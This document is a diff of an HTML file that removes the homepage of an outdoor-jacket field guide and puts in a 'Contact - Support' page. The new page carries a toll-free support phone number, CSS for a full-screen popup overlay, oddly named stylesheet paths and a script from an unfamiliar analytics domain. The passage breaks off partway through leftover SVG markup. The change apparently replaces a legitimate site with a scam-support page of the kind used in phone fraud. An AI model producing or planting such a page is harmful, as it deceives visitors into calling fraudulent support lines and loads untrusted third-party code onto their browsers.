@@ -1,64 +1,971 @@
-<!DOCTYPE html>
-<html lang="en">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Jackets | Outdoor Jacket Layering, Waterproof Ratings &amp; Features</title>
-<meta name="description" content="Jackets is an independent field guide to outdoor jackets, with a layer builder, a waterproof rating decoder and guides to layering and waterproof ratings.">
-<meta name="robots" content="index, follow, max-image-preview:large">
-<link rel="canonical" href="https://jackets.com/">
-<meta property="og:type" content="website"><meta property="og:site_name" content="Jackets">
-<meta property="og:title" content="Jackets | Outdoor Jacket Layering, Waterproof Ratings &amp; Features"><meta property="og:description" content="Jackets is an independent field guide to outdoor jackets, with a layer builder, a waterproof rating decoder and guides to layering and waterproof ratings.">
-<meta property="og:url" content="https://jackets.com/"><meta property="og:image" content="https://images.unsplash.com/photo-1501612232936-66971f07ff57?auto=format&fit=crop&w=1200&q=75">
-<meta name="twitter:card" content="summary_large_image"><meta name="theme-color" content="#17251F">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' fill='%2317251F'/%3E%3Cpath d='M20 7l13 25H7z' fill='%23F3F4F1'/%3E%3Cpath d='M7 33h26' stroke='%23E2572B' stroke-width='3'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://images.unsplash.com">
-<link href="https://fonts.googleapis.com/css2?family=Saira+Condensed:wght@400;600;800&family=Texturina:ital,opsz,wght@0,12..72,400;0,12..72,600;1,12..72,400&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<script>document.documentElement.classList.add("js")</script>
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "Organization", "name": "Jackets", "url": "https://jackets.com", "email": "hello@jackets.com", "telephone": "+1-888-777-5845", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}}, {"@type": "WebSite", "name": "Jackets", "url": "https://jackets.com"}]}</script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+
+    <title>Contact - Support</title>
+
+    <link rel="stylesheet" href="css/kTa00i9n5NV8.html" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253Dsf%20pro%252Cv1_7csf%20pro%20icons%252Cv1html.html">
+ <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-2DMKRPGVF0');
+</script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 </head>
-<body class="">
-<a class="skip" href="#main">Skip to content</a><div id="prog" aria-hidden="true"></div>
-<header class="jk-hd"><div class="jk-coord" aria-hidden="true"><div class="jk-w"><span>40.7255&deg; N &nbsp; 73.9983&deg; W</span><span>Field guide to outdoor jackets</span><span id="jk-clock">Basecamp</span></div></div><div class="jk-w jk-hd-in"><a class="logo" href="./" aria-label="Jackets home"><svg viewBox="0 0 40 40" aria-hidden="true"><path d="M20 5l15 28H5z" fill="#17251F"/><path d="M20 5l6 11-3 3-3-4-3 4-3-3z" fill="#F3F4F1"/><path d="M5 33h30" stroke="#E2572B" stroke-width="3"/></svg><span>Jackets</span></a><nav id="nav" aria-label="Main navigation"><ul><li><a href="./" aria-current="page">Basecamp</a></li><li><a href="jacket-layering-guide.html">Layering</a></li><li><a href="waterproof-ratings-guide.html">Waterproof Ratings</a></li><li><a href="about.html">About</a></li><li><a href="contact.html">Contact</a></li></ul></nav><button class="burger" aria-label="Open menu" aria-expanded="false" aria-controls="nav"><i></i><i></i><i></i></button></div></header>
-<main id="main">
 
-<section class="jk-hero"><div class="jk-hero-i pxw"><img data-px=".14" src="https://images.unsplash.com/photo-1501612232936-66971f07ff57?auto=format&fit=crop&w=1900&h=1200&q=75" alt="a hiker looking out over a wide mountain valley" width="1900" height="1200" fetchpriority="high"></div><div class="jk-w jk-hero-t"><p class="jk-ey">Field guide &middot; Outdoor jackets</p><h1><span class="o">Jackets</span><span class="f" aria-hidden="true">Jackets</span></h1><div class="jk-hero-r"><p>Layering for the weather, waterproof ratings decoded, and the small details that decide whether you come home dry.</p><a class="jk-btn" href="jacket-layering-guide.html">Start with layering</a></div></div><div class="jk-hero-alt" aria-hidden="true"><span>Elev.</span><b id="jk-el">0</b><span>m</span></div></section>
+<script>
+ 
+  window.SUPPORT_PHONE = {
+    display: "+1(888) 901-1933",   
+    tel:     "+18889011933"        
+  };
+</script>
 
-<div class="jk-tick mq" aria-hidden="true"><div><span><i aria-hidden="true">&#9650;</i>-5&deg;C &middot; wind 30 km/h</span><span><i aria-hidden="true">&#9650;</i>Drizzle &middot; 6 hours</span><span><i aria-hidden="true">&#9650;</i>Gusts to 60 km/h on the ridge</span><span><i aria-hidden="true">&#9650;</i>Snow above 1,200 m</span><span><i aria-hidden="true">&#9650;</i>Wind chill -14&deg;C</span><span><i aria-hidden="true">&#9650;</i>Showers clearing by noon</span><span><i aria-hidden="true">&#9650;</i>Fog on the coast</span><span><i aria-hidden="true">&#9650;</i>-5&deg;C &middot; wind 30 km/h</span><span><i aria-hidden="true">&#9650;</i>Drizzle &middot; 6 hours</span><span><i aria-hidden="true">&#9650;</i>Gusts to 60 km/h on the ridge</span><span><i aria-hidden="true">&#9650;</i>Snow above 1,200 m</span><span><i aria-hidden="true">&#9650;</i>Wind chill -14&deg;C</span><span><i aria-hidden="true">&#9650;</i>Showers clearing by noon</span><span><i aria-hidden="true">&#9650;</i>Fog on the coast</span></div></div>
 
-<section class="jk-s jk-an"><div class="jk-w jk-an-g"><div><p class="jk-ey">Anatomy of a shell</p><h2 class="rv">Six details that keep the weather out</h2><p class="jk-p">Tap a marker on the jacket to see what each feature does and what to check before you buy or head out.</p><div class="jk-an-o" id="an-o" aria-live="polite"></div><figure class="jk-an-i rv rv-w"><img src="https://images.unsplash.com/photo-1620031844368-d999525cb5e2?auto=format&fit=crop&w=640&h=300&q=75" alt="a close view of orange waterproof jacket fabric" width="640" height="300" loading="lazy"></figure></div><div class="jk-an-v"><svg viewBox="0 0 400 420" aria-hidden="true"><path class="jb" d="M150 70c0-40 20-58 50-58s50 18 50 58l52 26 40 230-46 8-26-150v206H130V184l-26 150-46-8 40-230z"/><path class="jh" d="M150 70c0-40 20-58 50-58s50 18 50 58c-14 14-30 20-50 20s-36-6-50-20z"/><path class="jz" d="M200 90v300"/><path class="jl" d="M130 184l20-20M270 184l-20-20M140 348h120M226 140h44v40h-44z"/><path class="jl" d="M110 130l20 50M290 130l-20 50"/></svg><button type="button" class="jk-hot on" style="left:50.0%;top:14.8%" data-i="0" aria-label="Hood"><span>1</span></button><button type="button" class="jk-hot" style="left:50.0%;top:47.6%" data-i="1" aria-label="Main zip"><span>2</span></button><button type="button" class="jk-hot" style="left:32.0%;top:35.7%" data-i="2" aria-label="Pit zips"><span>3</span></button><button type="button" class="jk-hot" style="left:14.5%;top:78.6%" data-i="3" aria-label="Cuffs"><span>4</span></button><button type="button" class="jk-hot" style="left:62.5%;top:83.8%" data-i="4" aria-label="Hem drawcord"><span>5</span></button><button type="button" class="jk-hot" style="left:62.0%;top:38.1%" data-i="5" aria-label="Chest pockets"><span>6</span></button></div></div></section>
+<style>
 
-<section class="jk-s jk-lb" id="layers"><svg class="jk-topo" viewBox="0 0 1400 900" preserveAspectRatio="xMidYMid slice" aria-hidden="true"><path d="M975 405 L971 412 L967 419 L964 426 L961 432 L960 439 L957 446 L953 453 L947 458 L938 461 L928 462 L917 461 L907 459 L899 458 L892 458 L887 461 L882 466 L875 473 L868 481 L859 487 L849 491 L839 492 L829 491 L820 488 L812 483 L804 478 L798 472 L792 466 L788 459 L786 451 L785 443 L786 436 L787 428 L788 422 L788 416 L786 411 L783 405 L780 399 L778 392 L778 386 L781 380 L785 374 L791 369 L796 364 L800 359 L802 352 L804 344 L807 335 L811 326 L817 318 L826 314 L837 312 L848 315 L859 320 L868 327 L876 333 L883 339 L889 343 L895 346 L901 348 L908 350 L915 352 L921 354 L928 357 L936 360 L944 363 L952 366 L960 371 L968 376 L974 382 L977 390 L977 397 L975 405Z"/><path d="M1072 405 L1063 419 L1056 432 L1053 445 L1051 458 L1049 472 L1043 486 L1032 497 L1017 505 L998 509 L978 510 L959 509 L944 510 L931 513 L920 520 L910 531 L898 543 L884 556 L868 566 L850 574 L830 578 L810 578 L790 576 L771 571 L753 564 L738 554 L726 541 L718 525 L715 508 L716 490 L720 473 L723 459 L723 447 L719 437 L710 427 L699 417 L688 405 L680 392 L678 378 L681 365 L690 353 L700 342 L710 332 L717 321 L722 307 L726 291 L731 274 L739 257 L751 243 L768 234 L789 231 L811 233 L832 240 L851 249 L868 259 L883 267 L897 275 L910 281 L922 287 L934 292 L946 297 L958 302 L973 305 L990 307 L1010 310 L1031 313 L1053 320 L1072 329 L1085 342 L1091 357 L1089 374 L1082 390 L1072 405Z"/><path d="M1159 405 L1148 425 L1143 444 L1141 464 L1138 484 L1131 503 L1117 520 L1098 534 L1074 543 L1049 550 L1026 555 L1005 562 L988 571 L972 584 L956 599 L938 615 L918 630 L894 642 L868 651 L840 658 L811 663 L781 666 L750 665 L720 659 L693 647 L672 628 L660 603 L656 574 L660 545 L667 518 L671 496 L670 479 L660 465 L643 453 L620 440 L598 424 L582 405 L574 384 L575 364 L584 344 L596 326 L608 308 L618 289 L625 269 L632 247 L641 223 L655 202 L674 184 L700 172 L729 166 L759 166 L789 169 L817 175 L844 182 L868 190 L891 199 L911 209 L930 220 L947 231 L963 241 L981 248 L1003 250 L1031 250 L1064 248 L1102 248 L1139 253 L1171 265 L1193 284 L1203 308 L1200 334 L1188 360 L1173 384 L1159 405Z"/><path d="M1244 405 L1235 431 L1230 456 L1223 481 L1212 505 L1195 527 L1174 546 L1150 563 L1126 578 L1105 594 L1085 612 L1066 631 L1046 652 L1023 672 L997 689 L968 703 L936 714 L903 723 L868 733 L831 744 L791 754 L749 760 L707 759 L668 748 L638 724 L619 690 L612 649 L615 607 L622 570 L627 540 L623 518 L607 502 L581 489 L549 473 L516 455 L491 431 L475 405 L469 377 L472 349 L480 322 L489 295 L498 267 L508 239 L520 210 L537 183 L561 159 L590 140 L625 127 L662 119 L698 114 L734 110 L769 108 L802 107 L836 110 L868 118 L898 131 L925 148 L948 166 L970 181 L993 190 L1022 191 L1060 186 L1107 178 L1159 172 L1212 174 L1257 187 L1289 211 L1304 242 L1304 278 L1292 314 L1274 348 L1257 378 L1244 405Z"/><path d="M1331 405 L1318 437 L1303 466 L1284 494 L1263 520 L1242 544 L1223 569 L1207 595 L1194 624 L1182 656 L1166 689 L1143 719 L1113 744 L1076 762 L1036 774 L994 782 L953 791 L912 803 L868 819 L821 837 L770 852 L717 857 L667 847 L626 820 L598 779 L585 729 L582 677 L585 631 L585 595 L577 568 L556 549 L524 533 L485 517 L446 495 L412 469 L387 439 L370 405 L360 369 L356 333 L355 295 L359 257 L370 219 L390 184 L420 154 L458 130 L502 112 L548 99 L591 89 L632 78 L670 65 L707 51 L746 39 L786 33 L828 37 L868 50 L905 71 L936 94 L966 114 L996 124 L1032 123 L1079 113 L1136 99 L1200 88 L1265 87 L1322 100 L1364 127 L1388 165 L1395 208 L1389 253 L1375 296 L1359 336 L1345 372 L1331 405Z"/><path d="M1407 405 L1378 441 L1348 473 L1320 502 L1300 531 L1290 563 L1289 600 L1292 643 L1293 690 L1284 737 L1261 779 L1224 812 L1176 832 L1124 844 L1071 850 L1020 858 L971 872 L921 892 L868 916 L810 936 L749 945 L690 936 L639 908 L600 864 L576 810 L563 754 L555 703 L546 663 L529 632 L503 609 L468 590 L428 569 L387 545 L349 516 L313 483 L282 446 L253 405 L229 360 L212 312 L206 263 L216 215 L245 172 L290 138 L347 113 L409 97 L468 85 L519 72 L562 56 L600 33 L636 7 L676 -17 L721 -33 L771 -37 L821 -27 L868 -7 L910 17 L949 36 L989 45 L1034 41 L1088 27 L1153 10 L1225 -2 L1297 -4 L1362 10 L1413 39 L1448 80 L1467 128 L1474 179 L1471 229 L1463 277 L1450 323 L1431 366 L1407 405Z"/><path d="M1452 405 L1408 443 L1373 476 L1355 509 L1356 547 L1372 593 L1395 648 L1412 710 L1414 771 L1394 826 L1353 867 L1296 894 L1232 909 L1167 918 L1106 928 L1048 943 L992 966 L932 991 L868 1011 L801 1020 L735 1010 L675 982 L625 939 L587 887 L558 834 L534 786 L510 746 L483 713 L450 685 L414 659 L377 632 L338 603 L298 571 L254 537 L206 498 L155 455 L105 405 L67 349 L47 289 L55 231 L91 179 L152 138 L229 110 L309 92 L382 79 L442 64 L487 42 L524 12 L559 -24 L598 -58 L645 -84 L700 -97 L758 -95 L815 -82 L868 -66 L918 -53 L968 -50 L1023 -58 L1086 -73 L1156 -89 L1231 -99 L1307 -96 L1376 -79 L1434 -48 L1481 -7 L1517 41 L1542 93 L1558 148 L1563 203 L1554 258 L1532 311 L1496 361 L1452 405Z"/><path d="M1468 405 L1428 444 L1413 482 L1425 524 L1458 577 L1499 641 L1533 712 L1547 785 L1533 852 L1492 905 L1431 942 L1359 966 L1285 983 L1215 999 L1147 1018 L1081 1041 L1013 1062 L941 1077 L868 1079 L796 1065 L729 1037 L669 999 L617 956 L571 915 L527 877 L484 844 L442 811 L401 778 L364 743 L330 707 L295 670 L255 634 L204 598 L140 561 L66 518 L-9 466 L-70 405 L-105 337 L-103 268 L-61 206 L12 156 L105 120 L201 97 L287 79 L355 60 L405 34 L442 -1 L477 -42 L516 -82 L564 -116 L621 -138 L683 -148 L746 -150 L807 -149 L868 -152 L930 -161 L996 -175 L1067 -190 L1143 -200 L1221 -200 L1296 -188 L1366 -165 L1431 -131 L1489 -92 L1543 -48 L1590 1 L1627 54 L1649 114 L1649 177 L1626 243 L1581 304 L1524 359 L1468 405Z"/><path d="M1493 405 L1482 448 L1504 495 L1550 551 L1605 620 L1652 697 L1676 778 L1670 854 L1634 919 L1576 971 L1504 1011 L1427 1043 L1349 1071 L1271 1096 L1192 1117 L1111 1130 L1028 1133 L946 1123 L868 1101 L795 1072 L728 1042 L664 1015 L601 993 L537 973 L474 951 L414 923 L363 887 L321 843 L287 795 L254 749 L214 707 L156 671 L79 635 L-14 594 L-109 543 L-189 479 L-237 405 L-242 327 L-201 254 L-122 193 L-21 146 L83 112 L177 86 L252 60 L309 29 L352 -8 L392 -49 L434 -91 L483 -128 L539 -159 L600 -184 L663 -207 L728 -231 L796 -257 L868 -284 L946 -307 L1028 -321 L1112 -322 L1193 -308 L1268 -282 L1339 -248 L1407 -211 L1475 -174 L1545 -137 L1613 -95 L1672 -45 L1712 15 L1725 85 L1705 161 L1658 236 L1596 302 L1535 358 L1493 405Z"/><path d="M1572 405 L1601 456 L1653 516 L1713 586 L1764 666 L1794 750 L1796 834 L1771 911 L1724 979 L1661 1040 L1588 1092 L1508 1136 L1420 1170 L1326 1191 L1227 1194 L1128 1182 L1033 1155 L947 1123 L868 1093 L795 1072 L723 1064 L647 1064 L567 1067 L485 1062 L408 1042 L343 1005 L291 955 L252 898 L215 843 L170 796 L105 757 L18 722 L-86 683 L-193 632 L-284 568 L-341 490 L-351 405 L-315 322 L-241 249 L-145 188 L-43 140 L51 100 L131 64 L196 28 L251 -10 L301 -48 L352 -87 L405 -124 L459 -162 L513 -204 L569 -251 L630 -305 L699 -360 L779 -410 L868 -446 L963 -460 L1057 -451 L1145 -422 L1225 -379 L1298 -332 L1370 -290 L1446 -255 L1528 -224 L1612 -190 L1688 -146 L1745 -86 L1771 -12 L1761 72 L1721 157 L1664 234 L1610 300 L1575 356 L1572 405Z"/><path d="M1718 405 L1770 468 L1825 540 L1871 620 L1900 705 L1908 793 L1896 880 L1868 965 L1824 1047 L1765 1122 L1688 1186 L1592 1233 L1481 1255 L1361 1250 L1240 1223 L1128 1181 L1030 1138 L945 1106 L868 1095 L792 1104 L709 1128 L617 1153 L521 1167 L429 1159 L347 1127 L281 1075 L228 1015 L179 956 L123 905 L49 864 L-45 827 L-154 786 L-262 734 L-352 667 L-409 585 L-424 495 L-397 405 L-338 321 L-259 246 L-172 182 L-88 127 L-9 78 L64 34 L135 -5 L204 -41 L269 -74 L328 -110 L379 -154 L424 -211 L467 -283 L517 -367 L580 -454 L662 -529 L760 -580 L868 -598 L976 -582 L1076 -539 L1165 -481 L1245 -424 L1323 -375 L1405 -339 L1495 -311 L1588 -281 L1675 -241 L1743 -182 L1782 -107 L1787 -19 L1764 71 L1726 155 L1691 229 L1674 291 L1683 348 L1718 405Z"/><path d="M1901 405 L1943 480 L1975 561 L1995 647 L2007 737 L2010 831 L2005 930 L1987 1032 L1947 1129 L1879 1213 L1779 1274 L1652 1301 L1509 1293 L1364 1256 L1232 1204 L1119 1154 L1026 1122 L946 1118 L868 1142 L783 1184 L687 1228 L582 1258 L477 1264 L380 1242 L295 1199 L221 1144 L151 1089 L76 1039 L-11 995 L-111 953 L-216 906 L-315 846 L-394 772 L-443 686 L-458 592 L-444 497 L-407 405 L-356 319 L-298 241 L-234 169 L-162 105 L-81 51 L7 7 L96 -27 L179 -57 L247 -92 L296 -141 L329 -211 L355 -306 L389 -417 L442 -531 L521 -630 L625 -696 L745 -721 L868 -704 L984 -656 L1087 -590 L1180 -525 L1267 -471 L1355 -431 L1449 -400 L1545 -368 L1634 -326 L1708 -267 L1756 -191 L1779 -106 L1782 -17 L1776 66 L1774 141 L1786 208 L1814 272 L1855 336 L1901 405Z"/><path d="M2067 405 L2080 490 L2089 577 L2100 669 L2117 769 L2135 877 L2142 994 L2124 1109 L2068 1210 L1968 1285 L1829 1321 L1666 1317 L1499 1280 L1347 1226 L1219 1176 L1117 1147 L1032 1150 L953 1182 L868 1233 L771 1288 L664 1330 L552 1350 L441 1344 L336 1318 L236 1281 L138 1239 L38 1197 L-67 1153 L-173 1104 L-272 1044 L-355 970 L-414 883 L-448 788 L-460 690 L-458 592 L-448 497 L-433 405 L-410 316 L-373 230 L-315 151 L-233 85 L-131 32 L-23 -6 L76 -38 L153 -75 L200 -130 L222 -211 L232 -321 L249 -452 L290 -586 L364 -703 L470 -785 L598 -820 L735 -811 L868 -767 L989 -704 L1098 -639 L1199 -582 L1296 -535 L1392 -494 L1486 -451 L1572 -399 L1645 -335 L1700 -261 L1742 -182 L1776 -104 L1810 -30 L1852 38 L1901 104 L1954 172 L2004 245 L2043 323 L2067 405Z"/><path d="M2193 405 L2189 497 L2197 593 L2223 695 L2259 810 L2287 934 L2287 1060 L2241 1174 L2143 1261 L1998 1309 L1824 1316 L1643 1290 L1476 1247 L1336 1207 L1224 1187 L1132 1194 L1050 1229 L964 1280 L868 1336 L761 1382 L646 1414 L525 1428 L403 1428 L277 1419 L149 1402 L19 1375 L-108 1335 L-222 1277 L-315 1199 L-380 1104 L-418 999 L-434 891 L-441 786 L-449 687 L-465 593 L-485 500 L-500 405 L-494 310 L-454 219 L-377 138 L-271 73 L-153 24 L-45 -16 L36 -61 L81 -124 L94 -214 L93 -334 L98 -474 L130 -618 L198 -745 L303 -837 L436 -886 L582 -892 L729 -865 L868 -818 L996 -763 L1113 -708 L1222 -653 L1323 -596 L1415 -533 L1495 -464 L1563 -389 L1623 -315 L1682 -246 L1747 -185 L1825 -131 L1914 -78 L2006 -19 L2089 49 L2152 130 L2187 219 L2197 312 L2193 405Z"/></svg><div class="jk-w"><div class="jk-lb-h"><p class="jk-ey">Tool 01 &middot; Layer builder</p><h2 class="rv">What should I wear today?</h2></div><div class="jk-lb-g"><div class="jk-lb-c">
-<label for="lb-t" class="jk-lb-tl">Air temperature <output id="lb-to">5&deg;C</output></label><input type="range" id="lb-t" min="-25" max="25" value="5">
-<div class="jk-tg" role="group" aria-label="Conditions"><label><input type="checkbox" id="lb-w" checked><span>Windy</span></label><label><input type="checkbox" id="lb-r"><span>Rain or snow</span></label><label><input type="checkbox" id="lb-a" checked><span>Moving hard</span></label></div><figure class="jk-lb-i rv rv-c"><img src="https://images.unsplash.com/photo-1704648167646-5f47c2e34d9f?auto=format&fit=crop&w=640&h=340&q=75" alt="a walker in a brown jacket on a snowy forest path" width="640" height="340" loading="lazy"></figure></div>
-<div class="jk-lb-o"><svg viewBox="0 0 300 300" aria-hidden="true"><g id="lb-svg"><path class="l l0" d="M120 60h60l40 30-14 30-16-8v148H110V112l-16 8-14-30z"/><path class="l l1" d="M114 52h72l46 34-18 40-20-10v152H106V116l-20 10-18-40z"/><path class="l l2" d="M106 44h88l54 38-22 48-24-12v156H98V118l-24 12-22-48z"/><path class="l l3" d="M98 34c0-22 20-30 52-30s52 8 52 30l56 44-26 56-28-14v162H96V120l-28 14-26-56z"/></g></svg><ol class="jk-lb-l" id="lb-l" aria-live="polite"></ol><p class="jk-lb-n" id="lb-n"></p></div></div></div></section>
 
-<section class="jk-s jk-wr" id="rating"><div class="jk-w jk-wr-g"><div class="jk-wr-v"><div class="jk-rain" id="wr-rain" aria-hidden="true"></div><div class="jk-col" aria-hidden="true"><i id="wr-col"></i><span>30k</span><span>20k</span><span>10k</span><span>5k</span><span>0</span></div><figure class="jk-wr-i"><img src="https://images.unsplash.com/photo-1772516912383-2d8d51fc53f1?auto=format&fit=crop&w=520&h=640&q=75" alt="water beading on blue waterproof fabric" width="520" height="640" loading="lazy"></figure></div><div><p class="jk-ey">Tool 02 &middot; Rating decoder</p><h2 class="rv">What does 20,000 mm actually mean?</h2><p class="jk-p">Fabric waterproofing is measured as a column of water, in millimetres, that the fabric holds back before it leaks. Slide to any number on a label.</p>
-<label for="wr-h" class="jk-lb-tl">Hydrostatic head <output id="wr-ho">10,000 mm</output></label><input type="range" id="wr-h" min="0" max="30000" step="500" value="10000">
-<label for="wr-b" class="jk-lb-tl">Breathability (g/m&sup2;/24h)</label><select id="wr-b"><option value="5000">5,000</option><option value="10000" selected>10,000</option><option value="15000">15,000</option><option value="20000">20,000</option><option value="25000">25,000+</option></select>
-<div class="jk-wr-o" id="wr-o" aria-live="polite"></div></div></div></section>
+.popup-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.55);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  z-index: 99999;
+}
 
-<section class="jk-st"><div class="jk-w"><p class="jk-ey">Four conditions</p><h2 class="rv">Read the weather, choose the layer</h2></div><div class="jk-w jk-stk"><div class="jk-sc" style="--n:0"><div class="jk-sc-i"><img src="https://images.unsplash.com/photo-1506679521122-0358839bedf1?auto=format&fit=crop&w=1100&h=700&q=75" alt="a person in a red hooded jacket standing by a grey sea" width="1100" height="700" loading="lazy"></div><div class="jk-sc-t"><span>Condition 01</span><h3>Coastal wind</h3><p>Wind strips heat faster than cold air alone. A windproof shell is the layer that matters most by the sea.</p></div></div><div class="jk-sc" style="--n:1"><div class="jk-sc-i"><img src="https://images.unsplash.com/photo-1778837705487-685ffd6d392d?auto=format&fit=crop&w=1100&h=700&q=75" alt="a hiker in a dark jacket on a misty forest path" width="1100" height="700" loading="lazy"></div><div class="jk-sc-t"><span>Condition 02</span><h3>Forest drizzle</h3><p>Light rain for hours tests breathability as much as waterproofing. Open the pit zips before you overheat.</p></div></div><div class="jk-sc" style="--n:2"><div class="jk-sc-i"><img src="https://images.unsplash.com/photo-1608570201133-f678b991d02a?auto=format&fit=crop&w=1100&h=700&q=75" alt="a climber in red crossing a steep snow slope" width="1100" height="700" loading="lazy"></div><div class="jk-sc-t"><span>Condition 03</span><h3>Snowfield</h3><p>Dry cold calls for insulation under a light shell, and a hood that fits over a hat.</p></div></div><div class="jk-sc" style="--n:3"><div class="jk-sc-i"><img src="https://images.unsplash.com/photo-1594832512784-dbd688e0572e?auto=format&fit=crop&w=1100&h=700&q=75" alt="a figure in red standing on a rocky summit above the clouds" width="1100" height="700" loading="lazy"></div><div class="jk-sc-t"><span>Condition 04</span><h3>Summit</h3><p>Stop, and the wind finds you. Carry a warm layer you can pull on over everything.</p></div></div></div></section>
+.ps-popup {
+  width: 100%;
+  max-width: 430px;
+  background: #ffffff;
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+  animation: popupIn 0.25s ease-out;
+  position: relative;
+}
 
-<section class="jk-tr"><div class="jk-w jk-tr-g"><a class="jk-trc rv" href="jacket-layering-guide.html"><i class="mk ci" aria-hidden="true"></i><span>Trail 01 &middot; Easy</span><b>Jacket Layering Guide</b><em>Base, mid, insulation and shell, for every temperature.</em></a><a class="jk-trc rv" href="waterproof-ratings-guide.html"><i class="mk sq" aria-hidden="true"></i><span>Trail 02 &middot; Moderate</span><b>Waterproof Ratings Explained</b><em>Hydrostatic head, breathability, seams and DWR.</em></a></div></section>
+@keyframes popupIn {
+  from { opacity: 0; transform: translateY(15px) scale(0.97); }
+  to   { opacity: 1; transform: translateY(0)   scale(1);    }
+}
 
-</main>
-<footer class="jk-ft"><svg class="jk-topo" viewBox="0 0 1400 500" preserveAspectRatio="xMidYMid slice" aria-hidden="true"><path d="M1279 300 L1265 312 L1248 321 L1232 328 L1218 334 L1209 341 L1204 348 L1200 356 L1197 365 L1193 375 L1187 383 L1180 391 L1171 398 L1161 404 L1150 411 L1139 417 L1127 424 L1114 429 L1100 433 L1085 433 L1071 432 L1057 427 L1044 422 L1032 417 L1020 411 L1007 406 L996 399 L985 392 L978 382 L975 370 L977 357 L982 344 L988 333 L993 323 L994 315 L989 308 L980 300 L967 291 L953 279 L943 266 L937 253 L938 240 L945 228 L955 219 L968 212 L982 206 L995 200 L1008 195 L1021 191 L1034 187 L1048 186 L1062 186 L1075 188 L1088 191 L1100 193 L1111 195 L1123 196 L1135 196 L1147 197 L1158 200 L1169 204 L1179 210 L1188 216 L1197 222 L1207 228 L1220 233 L1236 237 L1253 243 L1269 251 L1282 261 L1289 273 L1287 287 L1279 300Z"/><path d="M1427 300 L1399 321 L1371 338 L1348 353 L1331 367 L1319 382 L1310 397 L1302 413 L1294 430 L1283 447 L1272 464 L1259 482 L1245 501 L1229 522 L1210 542 L1187 559 L1160 571 L1130 576 L1100 574 L1071 565 L1044 553 L1019 541 L995 530 L971 522 L944 515 L918 508 L894 496 L876 479 L866 457 L866 431 L872 405 L881 382 L887 362 L886 346 L875 332 L855 317 L829 300 L803 279 L782 255 L770 229 L769 203 L777 179 L792 158 L812 139 L835 122 L860 108 L887 97 L916 90 L946 87 L977 88 L1005 92 L1032 97 L1056 100 L1078 100 L1100 95 L1123 88 L1148 82 L1174 78 L1200 80 L1223 88 L1244 101 L1261 116 L1279 129 L1299 141 L1325 149 L1356 157 L1390 166 L1423 179 L1450 198 L1464 222 L1464 249 L1451 275 L1427 300Z"/><path d="M1549 300 L1519 329 L1492 355 L1469 379 L1449 402 L1431 424 L1414 445 L1398 467 L1384 491 L1372 518 L1362 550 L1352 587 L1336 628 L1314 667 L1282 699 L1241 720 L1194 726 L1146 718 L1100 700 L1059 678 L1021 657 L986 641 L949 632 L910 626 L870 618 L833 605 L802 584 L783 554 L774 519 L775 482 L779 448 L779 420 L770 396 L750 375 L720 354 L686 329 L652 300 L625 267 L608 231 L602 193 L606 156 L618 120 L637 86 L663 55 L696 29 L738 10 L785 0 L837 -1 L888 6 L934 16 L975 24 L1008 26 L1038 19 L1068 3 L1100 -18 L1137 -37 L1177 -50 L1218 -52 L1256 -43 L1289 -25 L1319 -3 L1348 17 L1379 34 L1417 46 L1462 57 L1510 70 L1556 90 L1592 116 L1613 151 L1617 189 L1604 229 L1580 266 L1549 300Z"/><path d="M1673 300 L1650 338 L1624 374 L1596 406 L1565 435 L1535 462 L1508 488 L1489 518 L1480 555 L1478 602 L1477 659 L1469 721 L1448 782 L1410 832 L1356 863 L1292 872 L1224 861 L1159 835 L1100 804 L1048 776 L1000 755 L952 743 L902 735 L851 727 L803 712 L761 687 L730 653 L709 613 L695 572 L683 534 L667 500 L643 470 L611 442 L574 413 L536 380 L502 342 L476 300 L458 255 L446 208 L440 159 L441 108 L450 58 L472 10 L509 -31 L563 -60 L632 -75 L707 -74 L783 -63 L850 -47 L904 -36 L947 -37 L982 -52 L1016 -82 L1054 -118 L1100 -153 L1152 -178 L1208 -188 L1261 -182 L1311 -164 L1357 -141 L1401 -117 L1448 -97 L1499 -80 L1555 -64 L1612 -43 L1663 -16 L1703 21 L1728 66 L1736 115 L1730 165 L1714 213 L1694 258 L1673 300Z"/><path d="M1813 300 L1791 348 L1757 393 L1713 431 L1667 465 L1629 497 L1606 534 L1600 580 L1608 641 L1619 715 L1622 798 L1606 878 L1566 945 L1501 989 L1421 1005 L1333 995 L1247 968 L1169 934 L1100 901 L1037 875 L977 858 L918 845 L859 830 L803 809 L753 781 L710 746 L672 708 L637 671 L599 636 L557 604 L511 572 L463 538 L418 499 L381 454 L353 405 L334 354 L317 300 L301 244 L284 185 L268 122 L261 56 L273 -8 L310 -65 L375 -106 L462 -128 L562 -131 L661 -119 L748 -102 L818 -91 L869 -96 L909 -120 L946 -160 L988 -210 L1039 -258 L1100 -296 L1167 -317 L1237 -320 L1305 -311 L1370 -294 L1435 